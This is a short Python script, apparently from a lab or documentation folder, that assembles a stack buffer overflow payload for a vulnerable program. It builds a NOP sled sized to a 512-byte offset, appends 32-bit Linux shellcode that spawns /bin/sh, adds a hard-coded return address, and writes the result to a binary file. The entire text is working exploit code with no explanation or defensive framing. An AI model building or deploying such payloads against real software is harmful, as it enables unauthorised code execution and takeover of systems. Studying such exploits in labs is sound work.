OFFSET = 512
SHELLCODE = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x83\xe8\xf5\xcd\x80"
RETURN_ADDRESS = b"\x40\xc7\xff\xff"

NOP_SLED_LEN = OFFSET - len(SHELLCODE)

PAYLOAD = b"\x90" * NOP_SLED_LEN + SHELLCODE + RETURN_ADDRESS

with open("docs/codeexec/payload.bin", "wb") as f:
    f.write(PAYLOAD)